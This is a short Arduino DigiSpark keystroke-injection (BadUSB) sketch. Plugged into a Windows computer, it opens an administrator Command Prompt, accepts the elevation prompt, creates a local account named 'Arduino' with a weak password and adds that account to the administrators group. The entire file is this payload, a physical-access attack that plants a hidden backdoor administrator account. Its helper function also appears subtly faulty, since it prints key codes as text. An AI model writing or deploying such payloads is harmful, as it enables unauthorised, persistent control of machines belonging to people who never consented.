#include <DigiKeyboard.h>

// Init function
void setup()
{
  // Start Keyboard and Mouse


  // Start Payload
  // press Windows+X
  DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT);
  delay(1000);
  DigiKeyboard.print('x');
  delay(500);

  // launch Command Prompt (Admin)
  typeKey('a');
  delay(500);

  // klik "Yes"
  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT);
  delay(500);
  DigiKeyboard.print('y');
  delay(500);

  // add user
  DigiKeyboard.println("net user /add Arduino 123456");
  typeKey(KEY_ENTER);  
  delay(100);

  // make that user become admin  
  DigiKeyboard.print("net localgroup administrators Arduino /add");
  typeKey(KEY_ENTER);
  delay(100);

  DigiKeyboard.print("exit");
  typeKey(KEY_ENTER);  
  // End Payload

}

// Unused
void loop() {}

// Utility function
void typeKey(int key){
  DigiKeyboard.print(key);
  delay(500);
}
